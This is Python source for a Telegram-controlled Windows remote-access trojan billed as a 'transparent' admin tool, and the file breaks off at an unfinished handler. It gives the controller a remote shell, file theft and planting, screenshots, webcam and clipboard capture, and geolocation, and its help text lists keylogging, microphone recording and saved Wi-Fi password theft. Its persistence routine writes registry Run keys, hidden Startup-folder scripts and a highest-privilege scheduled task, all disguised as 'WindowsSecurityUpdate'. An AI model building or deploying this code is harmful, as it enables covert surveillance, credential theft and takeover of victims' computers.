"""
Remote Admin Tool - Client
Transparent remote administration via Telegram bot.
Shows a system tray icon when running.
"""

import os
import sys
import subprocess
import ctypes
import platform
import socket
import datetime
import threading
import time
import io
import tempfile
import shutil
import winreg
import struct
import wave
import hashlib
import re
import uuid

# Third-party
import telebot
import requests
from PIL import Image, ImageDraw, ImageGrab
import pystray
import pyttsx3
import cv2
import pyperclip
import psutil

# ============================================================
# CONFIGURATION (Replaced by builder)
# ============================================================
BOT_TOKEN = "PLACEHOLDER_TOKEN"
ADMIN_ID = "PLACEHOLDER_ID"

# ============================================================
# DEVICE IDENTITY (unique per machine, stable across reboots)
# ============================================================
def _get_device_id():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        mac = uuid.getnode()
        raw = f"{hostname}-{username}-{mac}"
        return hashlib.md5(raw.encode()).hexdigest()[:8]
    except:
        return "unknown"

DEVICE_ID = _get_device_id()
try:
    DEVICE_TAG = f"[{socket.gethostname()} | {os.getlogin()}]"
except:
    DEVICE_TAG = "[unknown]"

# ============================================================
# INITIALIZATION
# ============================================================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
selected_cam = 0
keylog_active = False
keylog_buffer = []

# ============================================================
# UTILITIES
# ============================================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def send_msg(chat_id, text):
    if not text or not text.strip():
        text = "(no output)"
    for i in range(0, len(text), 4000):
        try:
            bot.send_message(chat_id, text[i:i + 4000])
        except:
            pass

def get_system_info():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        local_ip = socket.gethostbyname(hostname)
        os_ver = f"{platform.system()} {platform.release()}"
        return (f"👤 User: {username}\n💻 Host: {hostname}\n"
                f"🌐 IP: {local_ip}\n🖥️ OS: {os_ver}\n"
                f"🔑 Admin: {'Yes' if is_admin() else 'No'}")
    except Exception as e:
        return f"System info error: {e}"

def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [('cbSize', ctypes.c_uint), ('dwTime', ctypes.c_uint)]
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0

def parse_args(text, cmd, min_args=1):
    parts = text.split(" ", min_args)
    if len(parts) < min_args + 1:
        return None
    return parts[1] if min_args == 1 else parts[1:]

# ============================================================
# COMMAND HANDLERS
# ============================================================

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id,
        f"✅ Remote Admin Tool Connected\n"
        f"🏷️ {DEVICE_TAG}  🆔 {DEVICE_ID}\n\n"
        f"{get_system_info()}\n\nType /help for commands.")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    h = """📋 Remote Admin - Commands

🖥️ System:
/shell <cmd> - Run shell command
/admincheck - Check admin
/sysinfo - Full system info
/whoami - User details
/datetime - Date & time
/shutdown - Shutdown PC
/restart - Restart PC
/logoff - Log off
/lock - Lock workstation
/sleep - Sleep mode
/listprocess - List processes
/prockill <name> - Kill process
/idletime - Idle time
/installed - Installed programs
/services - Windows services
/startup - Persist on reboot
/rmstartup - Remove persistence
/devices - List all online devices

📁 Files:
/cd <path> - Change directory
/dir - List directory
/currentdir - Show CWD
/download <file> - Download file
/upload - Upload (attach)
/uploadlink <url> <name> - URL→PC
/delete <path> - Delete file
/drives - List drives
/search <name> - Search files
/copy <src> <dst> - Copy file
/move <src> <dst> - Move file
/rename <old> <new> - Rename
/mkdir <path> - Create folder
/openfile <path> - Open file

🎭 Interaction:
/message <text> - Message box
/fakeerror <text> - Fake error
/voice <text> - TTS speak
/write <text> - Type keyboard
/wallpaper - Set wallpaper
/website <url> - Open URL
/audio - Play audio
/popup <n> <text> - Spam popups
/volumeup - Volume +10%
/volumedown - Volume -10%
/mute - Toggle mute
/monitors_off - Screen off

📷 Capture:
/screenshot - Screenshot
/clipboard - Clipboard text
/setclipboard <text> - Set clipboard
/getcams - List cameras
/selectcam <n> - Select cam
/webcampic - Cam picture
/geolocate - IP geolocation
/record <sec> - Record mic
/keylog - Start keylogger
/stopkeylog - Get keylog

🌐 Network:
/wifilist - Nearby WiFi
/wifipasswords - Saved creds
/ipconfig - Network info
/netstat - Connections
/env - Environment vars

🔒 Control:
/blocksite <site> - Block site
/unblocksite <site> - Unblock
/hidetaskbar - Hide taskbar
/showtaskbar - Show taskbar
/hidedesktop - Hide icons
/showdesktop - Show icons
/swap_mouse - Swap buttons
/unswap_mouse - Normal mouse

⚙️ /exit - Exit program"""
    send_msg(message.chat.id, h)

@bot.message_handler(commands=['shell'])
def cmd_shell(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    cmd = parse_args(message.text, "shell")
    if not cmd:
        bot.send_message(message.chat.id, "❌ Usage: /shell <command>")
        return
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=30, cwd=os.getcwd())
        output = (r.stdout + r.stderr).strip() or "(no output)"
        send_msg(message.chat.id, f"⚡ Output:\n{output}")
    except subprocess.TimeoutExpired:
        bot.send_message(message.chat.id, "⏰ Timed out (30s)")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['message'])
def cmd_message(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    msg = parse_args(message.text, "message")
    if not msg:
        bot.send_message(message.chat.id, "❌ Usage: /message <text>")
        return
    threading.Thread(
        target=lambda: ctypes.windll.user32.MessageBoxW(0, msg, "Message", 0x40),
        daemon=True).start()
    bot.send_message(message.chat.id, f"✅ Message shown: {msg}")

@bot.message_handler(commands=['voice'])
def cmd_voice(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    text = parse_args(message.text, "voice")
    if not text:
        bot.send_message(message.chat.id, "❌ Usage: /voice <text>")
        return
    def speak():
        try:
            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
            engine.stop()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Voice error: {e}")
    threading.Thread(target=speak, daemon=True).start()
    bot.send_message(message.chat.id, f"🔊 Speaking: {text}")

@bot.message_handler(commands=['admincheck'])
def cmd_admincheck(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id,
        f"🔑 Admin: {'✅ Yes' if is_admin() else '❌ No'}")

@bot.message_handler(commands=['cd'])
def cmd_cd(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    path = parse_args(message.text, "cd")
    if not path:
        bot.send_message(message.chat.id, "❌ Usage: /cd <path>")
        return
    try:
        os.chdir(path)
        bot.send_message(message.chat.id, f"📂 Now in: {os.getcwd()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['dir'])
def cmd_dir(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        items = os.listdir(os.getcwd())
        lines = []
        for item in sorted(items):
            full = os.path.join(os.getcwd(), item)
            if os.path.isdir(full):
                lines.append(f"📁 {item}/")
            else:
                try:
                    sz = os.path.getsize(full)
                    lines.append(f"📄 {item} ({sz:,} B)")
                except:
                    lines.append(f"📄 {item}")
        send_msg(message.chat.id, f"📂 {os.getcwd()}\n\n" + ("\n".join(lines) or "(empty)"))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['currentdir'])
def cmd_currentdir(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id, f"📂 {os.getcwd()}")

@bot.message_handler(commands=['download'])
def cmd_download(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    fp = parse_args(message.text, "download")
    if not fp:
        bot.send_message(message.chat.id, "❌ Usage: /download <filepath>")
        return
    if not os.path.isabs(fp):
        fp = os.path.join(os.getcwd(), fp)
    try:
        if not os.path.exists(fp):
            bot.send_message(message.chat.id, "❌ File not found")
            return
        if os.path.getsize(fp) > 50 * 1024 * 1024:
            bot.send_message(message.chat.id, "❌ File >50MB (Telegram limit)")
            return
        with open(fp, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📥 {os.path.basename(fp)}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['uploadlink'])
def cmd_uploadlink(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        bot.send_message(message.chat.id, "❌ Usage: /uploadlink <url> <filename>")
        return
    url, fname = parts[1], parts[2]
    try:
        r = requests.get(url, timeout=30, stream=True)
        save_path = os.path.join(os.getcwd(), fname)
        with open(save_path, 'wb') as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        bot.send_message(message.chat.id, f"✅ Downloaded to: {save_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['delete'])
def cmd_delete(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    fp = parse_args(message.text, "delete")
    if not fp:
        bot.send_message(message.chat.id, "❌ Usage: /delete <filepath>")
        return
    if not os.path.isabs(fp):
        fp = os.path.join(os.getcwd(), fp)
    try:
        if os.path.isfile(fp):
            os.remove(fp)
            bot.send_message(message.chat.id, f"🗑️ Deleted: {fp}")
        elif os.path.isdir(fp):
            shutil.rmtree(fp)
            bot.send_message(message.chat.id, f"🗑️ Deleted directory: {fp}")
        else:
            bot.send_message(message.chat.id, "❌ Not found")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['write'])
def cmd_write(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    text = parse_args(message.text, "write")
    if not text:
        bot.send_message(message.chat.id, "❌ Usage: /write <text>")
        return
    try:
        import pyautogui
        pyautogui.typewrite(text, interval=0.02)
        bot.send_message(message.chat.id, f"⌨️ Typed: {text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['clipboard'])
def cmd_clipboard(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        content = pyperclip.paste()
        send_msg(message.chat.id, f"📋 Clipboard:\n{content or '(empty)'}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['idletime'])
def cmd_idletime(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        idle = get_idle_time()
        mins, secs = divmod(int(idle), 60)
        hrs, mins = divmod(mins, 60)
        bot.send_message(message.chat.id, f"⏱️ Idle: {hrs}h {mins}m {secs}s")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['screenshot'])
def cmd_screenshot(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        buf.name = "screenshot.png"
        bot.send_photo(message.chat.id, buf, caption="📸 Screenshot")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['exit'])
def cmd_exit(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "👋 Exiting...")
    os._exit(0)

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "⚡ Shutting down...")
    subprocess.run("shutdown /s /t 5", shell=True)

@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "🔄 Restarting...")
    subprocess.run("shutdown /r /t 5", shell=True)

@bot.message_handler(commands=['logoff'])
def cmd_logoff(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "🚪 Logging off...")
    subprocess.run("shutdown /l", shell=True)

@bot.message_handler(commands=['datetime'])
def cmd_datetime(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    now = datetime.datetime.now()
    bot.send_message(message.chat.id,
        f"📅 {now.strftime('%Y-%m-%d')}\n🕐 {now.strftime('%H:%M:%S')}")

@bot.message_handler(commands=['prockill'])
def cmd_prockill(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    name = parse_args(message.text, "prockill")
    if not name:
        bot.send_message(message.chat.id, "❌ Usage: /prockill <process_name>")
        return
    try:
        r = subprocess.run(f"taskkill /IM {name} /F", shell=True,
                          capture_output=True, text=True)
        bot.send_message(message.chat.id, f"⚡ {(r.stdout + r.stderr).strip()}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['listprocess'])
def cmd_listprocess(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run("tasklist /FO CSV /NH", shell=True,
                          capture_output=True, text=True, timeout=15)
        lines = r.stdout.strip().split("\n")
        procs = []
        for line in lines[:80]:
            parts = line.replace('"', '').split(",")
            if len(parts) >= 2:
                procs.append(f"{parts[0]} (PID: {parts[1]})")
        output = "\n".join(procs) or "(none)"
        if len(lines) > 80:
            output += f"\n\n... and {len(lines) - 80} more"
        send_msg(message.chat.id, f"📋 Processes:\n{output}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['website'])
def cmd_website(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    url = parse_args(message.text, "website")
    if not url:
        bot.send_message(message.chat.id, "❌ Usage: /website <url>")
        return
    try:
        import webbrowser
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        webbrowser.open(url)
        bot.send_message(message.chat.id, f"🌐 Opened: {url}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['getcams'])
def cmd_getcams(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    cams = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cams.append(f"📷 Camera {i}")
            cap.release()
    if cams:
        bot.send_message(message.chat.id, "🎥 Available cameras:\n" + "\n".join(cams))
    else:
        bot.send_message(message.chat.id, "❌ No cameras found")

@bot.message_handler(commands=['selectcam'])
def cmd_selectcam(message):
    global selected_cam
    if str(message.from_user.id) != ADMIN_ID:
        return
    num = parse_args(message.text, "selectcam")
    if not num or not num.isdigit():
        bot.send_message(message.chat.id, "❌ Usage: /selectcam <number>")
        return
    selected_cam = int(num)
    bot.send_message(message.chat.id, f"📷 Selected camera: {selected_cam}")

@bot.message_handler(commands=['webcampic'])
def cmd_webcampic(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        cap = cv2.VideoCapture(selected_cam)
        if not cap.isOpened():
            bot.send_message(message.chat.id, f"❌ Camera {selected_cam} not available")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            bot.send_message(message.chat.id, "❌ Failed to capture")
            return
        _, buf = cv2.imencode('.png', frame)
        bio = io.BytesIO(buf.tobytes())
        bio.name = "webcam.png"
        bot.send_photo(message.chat.id, bio, caption=f"📷 Camera {selected_cam}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['geolocate'])
def cmd_geolocate(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = requests.get("http://ip-api.com/json/", timeout=10).json()
        if r.get("status") == "success":
            lat, lon = r.get("lat", 0), r.get("lon", 0)
            maps_url = f"https://www.google.com/maps?q={lat},{lon}"
            info = (f"🌍 Geolocation:\n"
                    f"IP: {r.get('query')}\n"
                    f"Country: {r.get('country')}\n"
                    f"Region: {r.get('regionName')}\n"
                    f"City: {r.get('city')}\n"
                    f"ISP: {r.get('isp')}\n"
                    f"Lat/Lon: {lat}, {lon}\n"
                    f"📍 Map: {maps_url}")
            bot.send_message(message.chat.id, info)
        else:
            bot.send_message(message.chat.id, "❌ Geolocation failed")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

# ============================================================
# DEVICE MANAGEMENT
# ============================================================

@bot.message_handler(commands=['devices'])
def cmd_devices(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        boot = datetime.datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.datetime.now() - boot
        hrs, rem = divmod(int(uptime.total_seconds()), 3600)
        mins, _ = divmod(rem, 60)
        try:
            pub_ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            pub_ip = "N/A"
        idle = get_idle_time()
        idle_m, idle_s = divmod(int(idle), 60)
        idle_h, idle_m = divmod(idle_m, 60)
        msg = (f"📱 Device Online\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"🏷️ {DEVICE_TAG}\n"
               f"🆔 ID: {DEVICE_ID}\n"
               f"{get_system_info()}\n"
               f"🌍 Public IP: {pub_ip}\n"
               f"⏱️ Uptime: {hrs}h {mins}m\n"
               f"💤 Idle: {idle_h}h {idle_m}m {idle_s}s\n"
               f"━━━━━━━━━━━━━━━━━━━━")
        bot.send_message(message.chat.id, msg)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {DEVICE_TAG} Error: {e}")

# ============================================================
# NEW COMMANDS
# ============================================================

@bot.message_handler(commands=['startup'])
def cmd_startup(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        # Get the correct executable path
        if getattr(sys, 'frozen', False):
            exe_path = os.path.abspath(sys.executable)
        else:
            exe_path = os.path.abspath(__file__)

        python_exe = os.path.abspath(sys.executable)
        is_frozen = getattr(sys, 'frozen', False)
        results = []

        # METHOD 1: Registry Run key (HKCU - no admin needed)
        try:
            run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            if is_frozen:
                reg_value = f'"{exe_path}"'
            else:
                reg_value = f'"{python_exe}" "{exe_path}"'
            winreg.SetValueEx(run_key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, reg_value)
            winreg.CloseKey(run_key)
            # Verify it was written
            verify_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_READ)
            stored = winreg.QueryValueEx(verify_key, "WindowsSecurityUpdate")[0]
            winreg.CloseKey(verify_key)
            results.append(f"✅ Registry Run key (verified)")
        except Exception as e:
            results.append(f"❌ Registry: {e}")

        # METHOD 2: Copy to Startup folder
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                r"Microsoft\Windows\Start Menu\Programs\Startup")
            if os.path.isdir(startup_folder):
                if is_frozen:
                    dst = os.path.join(startup_folder, "WindowsSecurityUpdate.exe")
                    shutil.copy2(exe_path, dst)
                    results.append(f"✅ Startup folder (exe copied)")
                else:
                    # Create a VBS wrapper that runs the script hidden (no console flash)
                    script_dir = os.path.dirname(exe_path)
                    vbs_path = os.path.join(startup_folder, "WindowsSecurityUpdate.vbs")
                    vbs_lines = [
                        'Set WshShell = CreateObject("WScript.Shell")',
                        f'WshShell.Run Chr(34) & "{python_exe}" & Chr(34) & " " & Chr(34) & "{exe_path}" & Chr(34), 0, False',
                    ]
                    with open(vbs_path, 'w') as vf:
                        vf.write('\n'.join(vbs_lines) + '\n')
                    # Also create a .bat as backup
                    bat_path = os.path.join(startup_folder, "WindowsSecurityUpdate.bat")
                    with open(bat_path, 'w') as bf:
                        bf.write(f'@echo off\n')
                        bf.write(f'cd /d "{script_dir}"\n')
                        bf.write(f'start "" /min "{python_exe}" "{exe_path}"\n')
                    results.append(f"✅ Startup folder (vbs + bat)")
            else:
                results.append("❌ Startup folder not found")
        except Exception as e:
            results.append(f"❌ Startup folder: {e}")

        # METHOD 3: Scheduled task (runs at logon)
        try:
            task_name = "WindowsSecurityUpdate"
            if is_frozen:
                tr_value = f'\\"{exe_path}\\"'
            else:
                tr_value = f'\\"{python_exe}\\" \\"{exe_path}\\"'

            # Delete old task if exists (ignore errors)
            subprocess.run(
                f'schtasks /delete /tn "{task_name}" /f',
                shell=True, capture_output=True, timeout=10
            )

            # Try with highest privileges first
            schtask_cmd = (
                f'schtasks /create /tn "{task_name}" '
                f'/tr "{tr_value}" '
                f'/sc onlogon /rl highest /f'
            )
            r = subprocess.run(schtask_cmd, shell=True, capture_output=True, text=True, timeout=15)
            if r.returncode == 0:
                results.append("✅ Scheduled task (admin)")
            else:
                # Fallback: try without /rl highest (limited user)
                schtask_cmd_limited = (
                    f'schtasks /create /tn "{task_name}" '
                    f'/tr "{tr_value}" '
                    f'/sc onlogon /f'
                )
                r2 = subprocess.run(schtask_cmd_limited, shell=True, capture_output=True, text=True, timeout=15)
                if r2.returncode == 0:
                    results.append("✅ Scheduled task (user-level)")
                else:
                    err = (r2.stderr or r.stderr or "Unknown error").strip()
                    results.append(f"❌ Task: {err[:100]}")
        except Exception as e:
            results.append(f"❌ Task: {e}")

        # METHOD 4: HKLM Run key (requires admin, strongest persistence)
        try:
            if is_admin():
                run_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                if is_frozen:
                    reg_value = f'"{exe_path}"'
                else:
                    reg_value = f'"{python_exe}" "{exe_path}"'
                winreg.SetValueEx(run_key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, reg_value)
                winreg.CloseKey(run_key)
                results.append("✅ HKLM Registry (all users)")
            else:
                results.append("ℹ️ HKLM skipped (no admin)")
        except Exception as e:
            results.append(f"❌ HKLM: {e}")

        report = "\n".join(results)
        bot.send_message(message.chat.id,
            f"🔄 Startup Persistence Results:\n\n{report}\n\n📂 Path: {exe_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['rmstartup'])
def cmd_rmstartup(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        results = []

        # Remove from HKCU registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsSecurityUpdate")
            winreg.CloseKey(key)
            results.append("✅ HKCU registry entry removed")
        except FileNotFoundError:
            results.append("ℹ️ No HKCU registry entry")
        except Exception as e:
            results.append(f"❌ HKCU Registry: {e}")

        # Remove from HKLM registry (if admin)
        try:
            if is_admin():
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSecurityUpdate")
                winreg.CloseKey(key)
                results.append("✅ HKLM registry entry removed")
            else:
                results.append("ℹ️ HKLM skipped (no admin)")
        except FileNotFoundError:
            results.append("ℹ️ No HKLM registry entry")
        except Exception as e:
            results.append(f"❌ HKLM Registry: {e}")

        # Remove from Startup folder
        try:
            startup_folder = os.path.join(
                os.environ.get('APPDATA', ''),
                r"Microsoft\Windows\Start Menu\Programs\Startup")
            removed_files = []
            for fname in ["WindowsSecurityUpdate.exe", "WindowsSecurityUpdate.bat", "WindowsSecurityUpdate.vbs"]:
                fp = os.path.join(startup_folder, fname)
                if os.path.exists(fp):
                    os.remove(fp)
                    removed_files.append(fname)
            if removed_files:
                results.append(f"✅ Removed: {', '.join(removed_files)}")
            else:
                results.append("ℹ️ No startup folder files")
        except Exception as e:
            results.append(f"❌ Startup folder: {e}")

        # Remove scheduled task
        try:
            r = subprocess.run('schtasks /delete /tn "WindowsSecurityUpdate" /f',
                shell=True, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                results.append("✅ Scheduled task removed")
            else:
                results.append("ℹ️ No scheduled task")
        except Exception as e:
            results.append(f"❌ Task: {e}")

        report = "\n".join(results)
        bot.send_message(message.chat.id, f"🗑️ Removal Results:\n\n{report}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['sysinfo'])
def cmd_sysinfo(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage(os.environ.get('SystemDrive', 'C:\\'))
        boot = datetime.datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.datetime.now() - boot
        hrs, remainder = divmod(int(uptime.total_seconds()), 3600)
        mins, secs = divmod(remainder, 60)

        try:
            gpu_info = subprocess.run(
                'wmic path win32_videocontroller get name',
                shell=True, capture_output=True, text=True, timeout=10
            ).stdout.strip().split('\n')
            gpu = gpu_info[-1].strip() if len(gpu_info) > 1 else 'Unknown'
        except:
            gpu = 'Unknown'

        info = (
            f"🖥️ SYSTEM INFORMATION\n"
            f"{'─' * 30}\n"
            f"👤 User: {os.getlogin()}\n"
            f"💻 PC: {platform.node()}\n"
            f"🖥️ OS: {platform.system()} {platform.release()} ({platform.version()})\n"
            f"🏗️ Arch: {platform.machine()}\n"
            f"🔑 Admin: {'Yes' if is_admin() else 'No'}\n"
            f"{'─' * 30}\n"
            f"⚡ CPU: {platform.processor()}\n"
            f"📊 CPU Usage: {cpu_percent}%\n"
            f"🧠 RAM: {mem.used // (1024**3):.1f} / {mem.total // (1024**3):.1f} GB ({mem.percent}%)\n"
            f"💾 Disk: {disk.used // (1024**3):.1f} / {disk.total // (1024**3):.1f} GB ({disk.percent}%)\n"
            f"🎮 GPU: {gpu}\n"
            f"{'─' * 30}\n"
            f"🌐 IP: {socket.gethostbyname(socket.gethostname())}\n"
            f"⏱️ Uptime: {hrs}h {mins}m {secs}s\n"
            f"🕐 Boot: {boot.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_msg(message.chat.id, info)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['lock'])
def cmd_lock(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        ctypes.windll.user32.LockWorkStation()
        bot.send_message(message.chat.id, "🔒 Workstation locked")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['sleep'])
def cmd_sleep(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        bot.send_message(message.chat.id, "😴 Going to sleep...")
        subprocess.run("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['volumeup'])
def cmd_volumeup(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        current = volume.GetMasterVolumeLevelScalar()
        new_vol = min(1.0, current + 0.1)
        volume.SetMasterVolumeLevelScalar(new_vol, None)
        bot.send_message(message.chat.id, f"🔊 Volume: {int(new_vol * 100)}%")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['volumedown'])
def cmd_volumedown(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        current = volume.GetMasterVolumeLevelScalar()
        new_vol = max(0.0, current - 0.1)
        volume.SetMasterVolumeLevelScalar(new_vol, None)
        bot.send_message(message.chat.id, f"🔉 Volume: {int(new_vol * 100)}%")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['mute'])
def cmd_mute(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        muted = volume.GetMute()
        volume.SetMute(not muted, None)
        status = '🔇 Muted' if not muted else '🔊 Unmuted'
        bot.send_message(message.chat.id, status)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['wifilist'])
def cmd_wifilist(message):
    if str(message.from_user.id) != ADMIN_ID:
        return
    try:
        r = subprocess.run('netsh wlan show networks mode=bssid',
            shell=True, capture_output=True, text=True, timeout=15)
        output = r.stdout.strip()
        if not output:
            bot.send_message(message.chat.id, "❌ No WiFi adapter or networks found")
            return
        networks = []
        current = {}
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('SSID') and 'BSSID' not in line:
                if current:
                    networks.append(current)
                current = {'ssid': line.split(':', 1)[1].strip()}
            elif line.startswith('Signal'):
                current['signal'] = line.split(':', 1)[1].strip()
            elif line.startswith('Authentication'):
                current['auth'] = line.split(':', 1)[1].strip()
        if current:
            networks.append(current)
        lines = []
        for n in networks[:30]:
            sig = n.get('signal', '?')
            auth = n.get('auth', '?')
            ssid = n.get('ssid', '(hidden)')
            if ssid:
                lines.append(f"📶 {ssid} | {sig} | {auth}")
        send_msg(message.chat.id, f"🌐 WiFi Networks:\n\n" + ("\n".join(lines) or "(none found)"))
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['wifipasswords'])
